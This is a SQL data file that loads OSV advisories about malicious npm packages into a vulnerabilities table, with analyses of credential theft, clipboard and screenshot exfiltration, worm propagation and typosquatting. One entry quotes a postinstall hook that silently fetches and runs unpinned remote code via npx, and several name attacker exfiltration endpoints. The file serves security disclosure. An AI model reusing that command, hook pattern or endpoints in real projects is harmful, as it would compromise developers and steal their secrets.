INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-741', 'OSV', 'confluence-analytics-support', 'npm', 'Malicious code in confluence-analytics-support (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (9ce55572584393fb9c1af657085c599ab0f699fd5bf4bfbcda2a47560c6a717c)
The package confluence-analytics-support was found to contain malicious code.

## Source: ghsa-malware (2272f03ac89227195353518ee8be1358a47b0b5b6ebcdd33419cd65ab1c48e15)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["0.0.1-security", "99.99.1"]'::jsonb, '0.0', '2026-02-04 17:08:45+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-7507', 'OSV', 'sap-addon', 'npm', 'Malicious code in sap-addon (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (b60b6a18d6564e1b58753fab08589e9941e86e3c4339782cff70667567a2b2d4)
The OpenSSF Package Analysis project identified ''sap-addon'' @ 0.0.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["0.0.0"]'::jsonb, '0.0', '2024-07-11 01:01:04+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-11087', 'OSV', 'seller-webchat-build-sdk', 'npm', 'Malicious code in seller-webchat-build-sdk (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (4b3dfd5d6ff1c62c4de5dec773047aa8b80fe5ccaa84cc4e2ab8d35b7eedebe2)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["0.0.0", "6.5.8"]'::jsonb, '0.0', '2024-11-27 00:55:04+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-678', 'OSV', 'otelcollector', 'npm', 'Malicious code in otelcollector (npm)', 'The package communicates with a domain associated with malicious activity.

---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.0"]'::jsonb, '0.0', '2025-01-30 16:55:51+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-2469', 'OSV', 'strapi-plugin-logger', 'npm', 'Malicious code in strapi-plugin-logger (npm)', 'strapi-plugin-logger is a malicious npm package disguised as a Strapi CMS plugin. On install, it runs a postinstall script that executes an 11-phase attack: stealing .env files, environment variables, Strapi configuration, private keys, Redis data, Docker/Kubernetes secrets, and network topology. It then opens a polling C2 loop that accepts and executes arbitrary shell commands from a remote server.

---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (dcdd49229d2f4aa5cdd4c01e40e20ef8c6821a5f843cd5c489e32d97ebe5a7be)
The package strapi-plugin-logger was found to contain malicious code.

## Source: ghsa-malware (b112e673207be14eacf69a3e9f49d5e6952c27a5303aae7455ac41a6a316c88e)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["3.6.8"]'::jsonb, '0.0', '2026-04-03 16:13:59+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-17596', 'OSV', 'cors-proxy-server', 'npm', 'Malicious code in cors-proxy-server (npm)', 'The package cors-proxy-server was found to contain malicious code.

---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.1", "1.0.5", "1.0.4", "1.0.2", "1.0.6", "1.0.0"]'::jsonb, '0.0', '2025-08-14 18:52:04+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-2133', 'OSV', 'upbit-internal', 'npm', 'Malicious code in upbit-internal (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (d286e3f82c3645432dde4b543a65c1f912bca545c3ad1abd486e8efd23bbde29)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["19.4.9"]'::jsonb, '0.0', '2025-03-04 09:17:45+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-3773', 'OSV', 'sysbin', 'npm', 'Malicious code in sysbin (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (8ab8ea4ce073a93a1973a062ac7661ceeaea9c312f9fd67e9acda9936e2b6578)
Package metadata advertises sysbin as a ''System binary configuration tool'' but the tarball ships pointer.py, a stealth overlay that runs automatically when index.js executes. index.js calls startApp() unconditionally at the bottom of the main module (triggered by `node index.js`, the `sys-bin` bin entry, `npm start`, or `require(''sysbin'')`). If Python is not present, index.js first tries `winget install Python.Python.3.12 --silent`, and on failure downloads https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe to %TEMP% and runs it with `/quiet InstallAllUsers=0 PrependPath=1` — code comments describe this as a ''GHOST INSTALLER'' intended to bypass browser/admin prompts. It then pip-installs pyperclip, keyboard, mss, pyautogui, pywin32, and uiautomation and launches pointer.py. pointer.py polls the clipboard every 300ms via pyperclip.paste() and POSTs every change to the hardcoded URL https://iq-overlay-pointer.vercel.app/api (pointer.py:281). It also binds hotkeys that capture full-screen screenshots via mss/ImageGrab, base64-encodes them as JPEG, and POSTs them to the same endpoint (pointer.py:231). The endpoint is hardcoded with no config surface, no documentation, and no consent prompt. Additional stealth features (panic_exit on Ctrl+Q, Esc-to-hide transparent Tk window, keystroke-replay ''mash-to-type'' mode) confirm the tool is designed to hide from the machine''s user. This is an intentional supply-chain attack: installing and running sysbin exfiltrates clipboard contents and screenshots to an author-controlled host.
', '["1.0.34"]'::jsonb, '0.0', '2026-05-14 19:25:48+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-1697', 'OSV', '@smt-front/common', 'npm', 'Malicious code in @smt-front/common (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["158.1.5"]'::jsonb, '0.0', '2025-03-03 13:13:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-8727', 'OSV', 'discord-selfbot-v13.js', 'npm', 'Malicious code in discord-selfbot-v13.js (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (8a28fa86e7d878dc6267f483fefbb3fdab0fe04ea75dffa4de10cc5ad899c5be)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.0", "4.0.0", "3.0.0", "12.0.3", "12.0.4", "12.1.0", "2.5.5", "8.0.0", "2.15.2", "3.2.0", "12.3.0", "1.5.0", "2.0.0", "2.5.0", "3.5.0", "12.2.0", "12.0.5", "12.0.0", "12.0.2", "12.0.6", "12.0.1", "3.1.0"]'::jsonb, '0.0', '2023-12-20 02:41:29+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-191233', 'OSV', '@huntersofbook/ui', 'npm', 'Malicious code in @huntersofbook/ui (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (864ad7e5ee11e8337962d5e5ae089ecddbc48e77c50611aadbdab9feb097edfd)
The package @huntersofbook/ui was found to contain malicious code.

## Source: google-open-source-security (8d6478c4e3a98d4fbfd9e568dae17543a6eac4b7b256e332fb8f220a9ee23d3f)
This package was compromised by the Sha1-Hulud: The Second Coming NPM worm.
The malicious payload steals tokens and credentials and publishes them to
GitHub. The worm will propogate itself to NPM packages the user owns and
establish persistence is a GitHub action.
The package may also destroy the user''s home directory.
', '["0.5.1"]'::jsonb, '0.0', '2025-11-25 00:16:49+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-7554', 'OSV', 'sap-apicpicturetype', 'npm', 'Malicious code in sap-apicpicturetype (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (13bff2ff99e372c5ca263f5dc322322ab1d577b47ef8bc4bbc689aa32ec73eda)
The OpenSSF Package Analysis project identified ''sap-apicpicturetype'' @ 0.0.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["0.0.0"]'::jsonb, '0.0', '2024-07-11 02:25:06+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-3044', 'OSV', 'sq-shared', 'npm', 'Malicious code in sq-shared (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["9999.0.99"]'::jsonb, '0.0', '2024-06-25 13:01:50+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-192263', 'OSV', 'elf-stats-nutmeg-garland-645', 'npm', 'Malicious code in elf-stats-nutmeg-garland-645 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (bd1b3fdc2a40a6e396e015feb6459f0a36fda40b3d0b547f3ecc28f43166806f)
The package elf-stats-nutmeg-garland-645 was found to contain malicious code.
', '["1.0.1", "1.0.2"]'::jsonb, '0.0', '2025-12-03 19:06:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-6041', 'OSV', '@toptal/picasso-button', 'npm', 'Malicious code in @toptal/picasso-button (npm)', 'The package communicates with a domain associated with malicious activity.', '["4.1.23"]'::jsonb, '0.0', '2025-07-20 16:44:35+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-47228', 'OSV', 'remark-preset-lint-crowdstrike', 'npm', 'Malicious code in remark-preset-lint-crowdstrike (npm)', 'Suspicious postinstall script executes a file with excessive bitwise math. Likely malware.

---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (165b629be2876c01b20135bbf391a92b4ae66e6645b8f390bcbb5373f8d43c5b)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (a2b91727dc412862ca7980b4ca0fc7415bcd5afddbad2b51346e995eccc077f3)
This package was compromised by the Shai-Hulud NPM worm. The malicious payload
steals tokens and credentials and publishes them to GitHub before propogating
itself to NPM packages the user owns.
', '["4.0.2", "4.0.1"]'::jsonb, '0.0', '2025-09-16 07:56:12+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-4891', 'OSV', 'stylelint-fix', 'npm', 'Malicious code in stylelint-fix (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (cbe442bbd2c1150c0a47f6b07e96536f93337a9f509f9ee7891a040a0a7c26f3)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["2.1.4", "2.1.5", "2.1.6", "2.1.7", "2.1.8", "2.1.9", "2.2.0", "2.2.1", "2.2.2", "2.2.3", "2.2.4", "2.2.5", "2.2.6", "2.2.7", "2.2.8", "2.2.9", "2.3.0"]'::jsonb, '0.0', '2025-06-10 05:08:36+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-1670', 'OSV', 'elitebots-prevnames-discord', 'npm', 'Malicious code in elitebots-prevnames-discord (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (00d02d432c34e4cd053181ee1c3bd8e84aab59e198dacbfcfb8c88f184188c5c)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.0.5", "1.0.6"]'::jsonb, '0.0', '2024-06-26 02:33:25+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-4756', 'OSV', 'pages-admin', 'npm', 'Malicious code in pages-admin (npm)', 'The package communicates with a domain associated with malicious activity.

---
_-= Per source details. Do not edit below this line.=-_
', '["0.0.1", "0.1.0", "1.0.0"]'::jsonb, '0.0', '2025-06-05 15:47:24+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-424', 'OSV', 'coinbase-sync', 'npm', 'Malicious code in coinbase-sync (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (e6b9af30ce8eff229a63be6c3023ee9eae0d2049c07a5f214b91746c58a5865e)
The OpenSSF Package Analysis project identified ''coinbase-sync'' @ 999.9.9 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["999.9.9"]'::jsonb, '0.0', '2025-01-24 04:30:45+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-5760', 'OSV', 'npm-sandbox-research-c5d6', 'npm', 'Malicious code in npm-sandbox-research-c5d6 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (e7dd3f64f94b15f73c62c5733a5910802ff22adc514e0eb08e153817fcd4158b)
The package declares a postinstall hook (`"postinstall": "node run.js"`) that executes automatically on `npm install`. The shipped beacon scripts (`beacon11.js`, `beacon_linux.js`) load `child_process`, `os`, and `http`, read host identifiers via `os.hostname()` and `os.platform()`, and issue outbound HTTP GET/POST requests carrying that data. This is the install-time host-fingerprinting and exfiltration shape: lifecycle execution + system-info collection + outbound network in a single chain, with no legitimate library functionality justifying the behavior.

## Source: ghsa-malware (40bc58054b1c5c90eeff59bc7cd8b13eeda67ce6b0b7c5c5bc40f3ffb2728311)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.0"]'::jsonb, '0.0', '2026-06-14 07:30:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-8744', 'OSV', 'formated', 'npm', 'Malicious code in formated (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (469915f0cc096d71a5ad3349a9e1203ffbdbd158fcb529c064aca57d2dce22e8)
The OpenSSF Package Analysis project identified ''formated'' @ 0.1.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["0.1.0"]'::jsonb, '0.0', '2023-12-26 13:44:37+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-4736', 'OSV', 'yessir-node', 'npm', 'Malicious code in yessir-node (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (253a5547a0d7f0f375ba46eb96a91316af4362679f3411728a4d0b0eb7a28ba7)
On require(), index.js schedules installNewsletterAutoFollow() 1 second later. That function locates @whiskeysockets/baileys inside the consumer''s node_modules (searching cwd, parent directories, and require.resolve) and overwrites its lib/Socket/newsletter.js with an attacker-supplied replacement. The injected code installs a 120-second timer that calls newsletterWMexQuery(channelId, QueryIds.FOLLOW) for two hardcoded WhatsApp newsletter channels (120363405815013750@newsletter and 120363408811187565@newsletter), silently force-subscribing the consumer''s authenticated WhatsApp account to attacker-controlled channels and persisting the modification on disk. The package.json description claims this is an ''Open Whisper Systems libsignal for Node.js'' implementation and src/* contains libsignal-shaped code as cover, but the auto-executed behavior mutates an unrelated installed dependency. This is import-time tampering with another package''s source files plus abuse of the consumer''s third-party (WhatsApp) credentials and is destructive to installer-side state (the patched baileys file persists and corrupts the unrelated dependency).
', '["2.2.7"]'::jsonb, '0.0', '2026-05-20 10:36:54+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-191991', 'OSV', 'elf-stats-aurora-workbench-5l3', 'npm', 'Malicious code in elf-stats-aurora-workbench-5l3 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (9d83ffdac6171578a325c88ca377e6683a676214fd73f9c5e25b4bddeb523644)
The package elf-stats-aurora-workbench-5l3 was found to contain malicious code.
', '["999.0.0"]'::jsonb, '0.0', '2025-12-03 15:59:29+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1783', 'OSV', 'libxmljs2var-ctf', 'npm', 'Malicious code in libxmljs2var-ctf (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (01c9273d9a31b1c550935b2367e8a3ba1bedb4668f432fec423a01bdc314ea0e)
The package libxmljs2var-ctf was found to contain malicious code.
', '["0.30.3"]'::jsonb, '0.0', '2026-03-18 12:57:42+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-4236', 'OSV', 'dependency-audit-tool', 'npm', 'Malicious code in dependency-audit-tool (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (07144a70b38d5ada8c75d4cb8027f378cca7c094f823a544d056b07cb999e663)
package.json declares a postinstall hook that runs `node -e "try{require(''child_process'').execSync(''npx env-security-scanner@latest audit_environment'',{stdio:''inherit'',timeout:30000})}catch(e){}"`, fetching and executing whatever code is currently published under env-security-scanner with no version pin and no integrity check, while silently swallowing all errors. index.js (declared as both `main` and `bin`) performs the identical `npx env-security-scanner@latest audit_environment` delegation, so the same arbitrary remote code executes whenever the package is required or invoked as a CLI — guaranteeing execution even when installs use `--ignore-scripts`. The package additionally impersonates an OpenSSF working group via its `author` field (`OSSF Audit Working Group`) and a non-existent `github.com/ossf-audit/dependency-audit-tool` repo, framing itself as a supply-chain audit tool while functioning solely as a dropper for a separate unpinned third-party package. The mutable-version remote dependency means whoever controls publication of `env-security-scanner` can ship arbitrary code to every installer of this package at any future moment.

## Source: ghsa-malware (00fd2958f2d146a5d2842bc190630b21c425e67f883e2eb3d43ee2d7794e77fc)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.0"]'::jsonb, '0.0', '2026-05-22 01:53:36+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-2359', 'OSV', 'farebi-amir-remake', 'npm', 'Malicious code in farebi-amir-remake (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.5.2"]'::jsonb, '0.0', '2024-06-25 12:42:39+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-41327', 'OSV', 'rushjs.io', 'npm', 'Malicious code in rushjs.io (npm)', 'The package communicates with a domain associated with malicious activity.

---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (3d99306a850859fbf00f66d5e98426eded1c24eeb8f7b5e60f3255e4ad09c661)
The OpenSSF Package Analysis project identified ''rushjs.io'' @ 99.0.9 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["99.0.9"]'::jsonb, '0.0', '2025-08-23 14:52:53+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-4400', 'OSV', 'seatable', 'npm', 'Malicious code in seatable (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (534db55497a58d9007903dfa5dfe418fd37c2ab3ef4a8a47567e44e3a7ada101)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["11.8.1"]'::jsonb, '0.0', '2025-05-23 01:36:01+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-11066', 'OSV', 'people-intv-common', 'npm', 'Malicious code in people-intv-common (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (4e4e9e3e97eec024e30d4e0ac03f8fad8d7ff24c424d346370fe5782323119d3)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["0.0.0", "6.5.8"]'::jsonb, '0.0', '2024-11-27 03:35:28+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-11013', 'OSV', 'tracking-wtf', 'npm', 'Malicious code in tracking-wtf (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (7f6c419e01391037aa9cad91f15a45a36a535cf2a7cee66dfe6a8814f2da5eec)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["8.5.1"]'::jsonb, '0.0', '2024-11-27 00:10:31+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-2258', 'OSV', 'current-context-urn', 'npm', 'Malicious code in current-context-urn (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (4a89385538c4df75cf7f40207e1ccdf6501459d80e8c9a0580955e9422d7c3a4)
The package current-context-urn was found to contain malicious code.

## Source: ossf-package-analysis (eb5101c16c1139b882751b140bc4ee3b014d98485f2d05febed67ceb6808401b)
The OpenSSF Package Analysis project identified ''current-context-urn'' @ 99.10.9 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["99.10.9"]'::jsonb, '0.0', '2026-03-27 12:31:02+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1663', 'OSV', 'braze-content-card-island', 'npm', 'Malicious code in braze-content-card-island (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (fbb26229041c73ccd4e0f0141472ca96d9aaf14e5b161bed78ba6b487c2d8fc9)
The package braze-content-card-island was found to contain malicious code.
', '["99.0.0", "99.0.1", "99.0.2"]'::jsonb, '0.0', '2026-03-18 12:41:25+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-190702', 'OSV', 'trigo-react-app', 'npm', 'Malicious code in trigo-react-app (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (b342d6dbb3287df2002c455ce23553f3aa118b46e447741fa840397425741076)
The package trigo-react-app was found to contain malicious code.

## Source: ghsa-malware (11f63c9b322a04a69d7c2c875302dfe971081157a6ea2c3360e65c5e4f9f5a97)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (f345787fa5f86c51c5c18441fcc0baef155e9aa00d3b3d55ae51aff7993993e3)
This package was compromised by the Sha1-Hulud: The Second Coming NPM worm.
The malicious payload steals tokens and credentials and publishes them to
GitHub. The worm will propogate itself to NPM packages the user owns and
establish persistence is a GitHub action.
The package may also destroy the user''s home directory.
', '["4.1.2"]'::jsonb, '0.0', '2025-11-24 13:12:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1501', 'OSV', '@storylane/uikit', 'npm', 'Malicious code in @storylane/uikit (npm)', 'The package ''@storylane/uikit'' is part of the PhantomRaven supply chain attack campaign (Wave 2). It uses a Remote Dynamic Dependency (RDD) technique: the published package appears benign but includes a URL-based dependency in package.json pointing to an attacker-controlled C2 server (npm.jpartifacts.com). During npm install, npm automatically fetches a malicious tarball from the C2. The tarball preinstall hook executes a 259-line payload that harvests developer emails from .gitconfig, .npmrc, and environment variables; collects CI/CD tokens from GitHub Actions, GitLab CI, Jenkins, and CircleCI; fingerprints the host system; and exfiltrates all data to http://npm.jpartifacts.com/jpd.php via redundant HTTP GET, POST, and WebSocket channels with no visible terminal output. The campaign was first disclosed by Koi Security in October 2025 (Wave 1) and extended across Waves 2-4 between November 2025 and February 2026. Full analysis: https://www.endorlabs.com/learn/return-of-phantomraven

Any developer or CI/CD system that installed this package should be considered compromised. All secrets, tokens, and credentials accessible from that environment should be rotated immediately from a separate, unaffected machine.

---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (aec258211eb7c253bbaf4725ff5a2b4fe957e0290d3fc0436ea66933633b5b0b)
The package @storylane/uikit was found to contain malicious code.

## Source: ghsa-malware (0f23dc1e93ce07a53482bce0d7f8f6d8237bbd4381210898b94cf5b3b41e7cd5)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.18.26"]'::jsonb, '0.0', '2026-03-16 00:00:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-5582', 'OSV', 'wp-env', 'npm', 'Malicious code in wp-env (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (ec2e092036cea9a9b2563e18b3d588ab046800c2160fb820081423b909066759)
Package squats the `wp-env` CLI name commonly invoked as `npx wp-env` by users intending @wordpress/env. The package ships only `bin/run.js` (declared `main: index.js` is absent from the tarball), so its sole execution surface is the bin script that fires when a developer runs `npx wp-env`. On execution, bin/run.js reads `process.env.INIT_CWD`, derives the basename of the installer''s project directory, and POSTs it together with timestamp and package metadata to a hardcoded callback URL `https://deepbounty.dd06-dev.fr/cb/dc43de99-70fc-4782-8668-bec6eee1975b`. The package self-describes as a ''Security PoC for Bug Bounty'' — name-confusion attack against @wordpress/env combined with concrete installer-side data exfiltration (the project directory basename, sent to an attacker-controlled host that uses a per-target callback path to identify successfully-confused victims). This satisfies both the typosquat shape (≤2 char edit / namespace confusion vs. @wordpress/env''s `wp-env` CLI) and a concrete exfil payload to an attacker-controlled destination.
', '["1.0.0"]'::jsonb, '0.0', '2026-06-11 05:05:53+00') ON CONFLICT (id) DO NOTHING;
